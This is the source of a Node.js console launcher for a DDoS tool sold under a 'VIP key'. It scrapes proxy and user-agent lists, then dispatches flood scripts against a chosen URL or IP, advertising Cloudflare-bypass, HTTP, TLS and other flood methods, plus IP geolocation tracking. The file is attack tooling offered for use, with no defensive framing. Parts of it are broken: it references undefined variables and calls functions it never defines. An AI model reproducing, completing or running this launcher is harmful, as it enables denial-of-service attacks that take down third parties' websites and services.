#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '3.6.8'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`

  ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
  ▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
  ▐▓█░░▄░░▀▄░░█▓▌░█▄▄▄█░
  ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
  ░░░░▄▄███▄▄░░░░░█████░ : Read the note!
┌────────────────────────────────────────────────────────────┐
│                      Information                           │
├────────────────────────────────────────────────────────────┤
│ Tool Name: ZenoObfuscate's SPECIAL TOOLS                   │
│ Version: SpXeno ${version}                                      │
│ Owner: SantoMxBhai & ZenoObfuscate                         │
│ Premium: Enable                                            │
│ User: ZenoObfuscate                                        │
├────────────────────────────────────────────────────────────┤
│ > Telegram: @StarsXPD                                      │
│ > Channel: https://t.me/apidomod                           │
│ > Powerful Tools and ©2025 All Rights Reserved!            │
└────────────────────────────────────────────────────────────┘
==============================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://pastebin.com/raw/sBH3iYXp');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
      console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
      
      const secretBangetJir = await fetch('https://pastebin.com/raw/6EnLmwpE');
      const password = await secretBangetJir.text();
      console.log(`Login Key Required`);
      permen.question('[\x1b[1m\x1b[31mroot@ZenoObfuscate \x1b[0m]: \n', async (skibidi) => {
        if (!skibidi.trim()) { // ဘာမှမထည့်ဘဲ Enter နှိပ်ရင်
    console.log('Enter your vip key'); // Enter your vip key message ကို ထုတ်ပါ
    return bootup(); // function ကို ထပ်မစေဘဲ return လုပ်ပါ
  }
        if (skibidi === password.trim()) {
          console.log(`Successful, Please Waiting...`);
          await scrapeProxy();
          console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`);
          await scrapeUserAgent();
          console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`);
          await sleep(700);
          console.clear();
          console.log(`Tool is Automatically Starting : Current - ${version}`);
          await sleep(1000);
          await banner();
          console.log(`Type "help" to show all available commands\n`);
          sigma();
        } else {
          console.log(`Wrong Key`);
          process.exit(-1);
        }
      });
    } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting Auto Update...`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Installing update`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`Can't connect your connection!`);
    // Wait for 5 seconds and then exit
    setTimeout(() => {
      process.exit();
    }, 5000); // 5000 milliseconds = 5 seconds
  }
}
// [========================================] //
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`

┌────────────────────────────────────────────────────────────┐
│                    Tracking IP Address Result              │
├────────────────────────────────────────────────────────────┤
│ - Flags: ${ipInfo.country_flag}                            
│ - Country: ${ipInfo.country_name}                          
│ - Capital: ${ipInfo.country_capital}                       
│ - City: ${ipInfo.city}                                     
│ - ISP: ${ipInfo.isp}                                       
│ - Organization: ${ipInfo.organization}                     
│ - Latitude: ${ipInfo.latitude}                             
│ - Longitude: ${ipInfo.longitude}                           
│                                                            
│ Google Maps: https://www.google.com/maps/place/            
│ ${additionalInfo.latitude}+${additionalInfo.longitude}     
└────────────────────────────────────────────────────────────┘
 
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`
Ongoing Status :
┌────────────────────────────────────────────────────────────┐
│ Target     : ${process.target}                                      │
│ Duration   : ${process.duration} Seconds                                  │
│ Methods    : ${process.methods}                                     │
│ AS         : ${result.as}                                   │
│ IP         : ${result.query}                                │
│ ISP        : ${result.isp}                                  │
│ Status     : ${Math.floor((Date.now() - process.startTime) / 1000)}                             │
│ Sender     : ZenoObfuscate                                   │
└────────────────────────────────────────────────────────────┘
`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
console.log(`
+-------------------------------------------------------------+
|                         USAGE EXAMPLE                       |
|-------------------------------------------------------------|
|  Command Format:                                            |
|    attack <url/ip> <duration> <methods>                     |
|                                                             |
|  Example:                                                   |
|    attack https://zeno.com 500 flood                        |
|                                                             |
|  Description:                                               |
|    - <url/ip>: The target URL or IP address.                |
|    - <duration>: The duration of the attack in seconds.     |
|    - <methods>: The method to use for the attack.           |
+-------------------------------------------------------------+
`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░ [ Let's Down ]
┌────────────────────────────────────────────────────────────┐
│ Target     : ${target}                                      │
│ Duration   : ${duration}                                    │
│ Methods    : ${methods}                                     │
│ AS         : ${result.as}                                   │
│ IP         : ${result.query}                                │
│ ISP        : ${result.isp}                                  │
│ Status     : Attack Successfully                            │
│ Sender     : SantoMxBhai                                    │
└────────────────────────────────────────────────────────────┘
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else   if (methods === 'cloud') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	  } else if (methods === 'uam') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
	} else if (methods === 'cfa') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
		} else if (methods === 'bypass-x') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
	} else if (methods === 'CFBypass') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 60`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
      } else if (methods === 'vip') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration}`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
        } else if (methods === 'tlsv1') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 40 proxy.txt`)
	sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/rape`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
┌────────────────────────────────────────────────────────────┐
│                𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗯𝘆 𝗭𝗲𝗻𝗼𝗢𝗯𝗳𝘂𝘀𝗰𝗮𝘁𝗲                    │
├────────────────────────────────────────────────────────────┤
│ 𝐓𝐡𝐚𝐧𝐤 𝐓𝐨 :                                                 │
│                                                            │
│ • SantoMxBhai                                              │
│ • Unknown                                                  │
│ • 한린xBomAi                                               │
│ • FlinX                                                    │
│ • All Subscribers                                          │
│ • My Team                                                   │
│ • All Creators                                            │
│                                                            │
│ ©2024-2025 | All Rights Reserved.                          │
└────────────────────────────────────────────────────────────┘
`
permen.question('[\x1b[1m\x1b[32mroot@ZenoObfuscate DDoS\x1b[0m]: \n', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | Show list of available methods
| track-ip     | Track IP address with info
| attack       | Launch DDoS attack
| ongoing      | Show ongoing attack
| credits      | Show creator of these tools
| clear        | Clear terminal
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| bypass    || Bypass With High Power
|| bypass    || Bypass With High Power Pro
|| cfa       || Cloudflare Bypass
|| CFBypass  || Cloudflare Bypass
|| cloud     || Cloudflare Bypass
|| destroy   || Kill That Socket
|| flood     || HTTP(s) Flood DoS
|| kill      || Bypass Cf DDoS methods
|| rape      || Bypass Protection
|| raw       || Huge RPS Flexing XD
|| slim      || Oh Is Fit There
|| storm     || The Raining Request
|| strike    || Best DDoS methods
|| thunder   || Massive Power Methods
|| tls       || TLS 1.3
|| tlsv1     || TLS Pro
|| uam       || VIP
|| vip       || VIP METHODS
[=========================================]
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()